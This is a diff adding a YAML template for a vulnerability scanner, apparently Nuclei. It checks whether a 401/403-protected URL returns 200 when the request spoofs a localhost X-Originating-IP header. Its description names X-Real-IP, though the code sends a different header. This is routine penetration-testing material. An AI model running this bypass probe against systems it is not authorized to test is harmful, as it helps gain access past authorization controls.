@@ -1,0 +1,38 @@
+id: Authorization-bypass
+
+info:
+  name: Custom IP Authorization Bypass
+  author: MNM
+  severity: medium
+  description: Checks for 401/403 responses and attempts bypass using X-Real-IP header
+
+flow: http(1) && http(2)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    matchers:
+      - type: status
+        name: auth-required
+        status:
+          - 401
+          - 403
+        internal: true  # This prevents printing results for the first request
+
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      X-Originating-IP: "127.0.0.1"
+    
+    matchers:
+      - type: status
+        status:
+          - 200
+        condition: and
+    extractors:
+      - type: dsl
+        dsl:
+          - '"X-Originating-IP: 127.0.0.1"'
